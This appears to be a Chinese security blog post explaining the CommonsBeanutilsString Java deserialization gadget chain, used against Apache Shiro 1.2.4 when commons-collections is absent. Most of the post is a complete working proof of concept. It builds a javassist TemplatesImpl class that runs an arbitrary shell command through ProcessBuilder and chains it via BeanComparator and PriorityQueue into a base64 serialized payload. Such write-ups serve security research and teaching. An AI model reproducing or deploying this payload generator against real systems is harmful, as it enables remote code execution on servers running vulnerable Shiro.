---
title: Java反序列化利用链之CommonsBeanutilsString
date: 2024-03-04 18:53:00 +0800
img_path: /
categories: [Java安全, Java反序列化]
tags: [Java安全, Java反序列化]     

---

# CommonsBeanutilsString

在`shiro 1.2.4`中是默认存在一个`CommonsBeanutils 1.8.3`的依赖的，所以打`shiro`反序列化时可以尝试使用`CommonsBeanutilsString`打，也就是不依赖`cc`的链子。

![image-20240304173654353](assets/image-20240304173654353.png)

为什么`CommonsBeanutils1`不行呢？

```java
//   CommonsBeanutils1
     final BeanComparator comparator = new BeanComparator();
```

回到`BeanComparator`的构造方法中可以看到当我们使用`CommonsBeanutils1`的`Poc`时，创建`BeanComparator`使用的是

`BeanComparator(String property)`的构造方法，在该方法中其实是使用了`commons-collections`这个依赖的。

![image-20240304174405667](assets/image-20240304174405667.png)

所以当我们不存在`commons-collections`依赖时`CommonsBeanutils1`这条链子就不能正常走通了。

```java
Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/commons/collections/comparators/ComparableComparator
	at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:81)
	at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:59)
	at org.example.cb1.CB1Poc.main(CB1Poc.java:52)
Caused by: java.lang.ClassNotFoundException: org.apache.commons.collections.comparators.ComparableComparator
	at java.net.URLClassLoader.findClass(URLClassLoader.java:387)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:355)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
	... 3 more
```

但是我们可以看到下方还存在一个`BeanComparator`的构造方法：

![image-20240304174932492](assets/image-20240304174932492.png)

而且当我们指定`comparator`后就可以不使用`ComparableComparator`从而绕过`cc`依赖的限制。

那么我们需要去找一个类进行替换，满足以下条件

- 实现`Serializable`接口
- 实现`Comparator`接口
- `Java`或者`commons beanutils`中自带

这里的话找到了`Java.lang.String`下的`CaseInsensitiveComparator`这个内部类，他满足了上面的条件，代码如下

![image-20240304175153118](assets/image-20240304175153118.png)

`String`类还有一个静态成员变量`CASE_INSENSITIVE_ORDER`是`CaseInsensitiveComparator`对象，那我们可以直接拿来用，只需把之前的POC的new的那行代码进行更改，传入两个参数让他去调用俩参数的构造方法即可，但是这里直接运行会报错`java.lang.Integer cannot be cast to java.lang.String`，我们只需要把`queue.add`添加的东西变为字符串即可，就变成了：

```java
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
```

`pom.xml`文件依赖：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>JavaDeserialization</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    <dependencies>
        <dependency>
            <groupId>javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.12.1.GA</version>
        </dependency>
        <dependency>
            <groupId>commons-beanutils</groupId>
            <artifactId>commons-beanutils</artifactId>
            <version>1.8.3</version>
        </dependency>
    </dependencies>
</project>
```

最终`Poc`如下：

```java
package org.example.cbstring;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.example.util.Tools;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CBStringPoc {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static CtClass genPayload(String cmd) throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public Exp() throws Exception {\n" +
                "            try {\n" +
                "                    String tc = \"" + cmd + "\";\n" +
                "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") " +
                "                        ? new String[]{\"cmd.exe\", \"/c\", tc} : new String[]{\"/bin/sh\", \"-c\", tc};" +
                "            new ProcessBuilder(cmd).start();" +
                "            } catch (Exception e) {\n" +
                "                e.getStackTrace();\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static String base64Encode(byte[] bytes) {
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString(bytes);
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{genPayload("calc").toBytecode()});
        setFieldValue(obj, "_name", "Hello");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
		//CommonsBeanutilsString
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        
        final PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        byte[] se = serialize(queue);
        System.out.println(base64Encode(se));
        Tools.deserialize(se);
    }
}
```

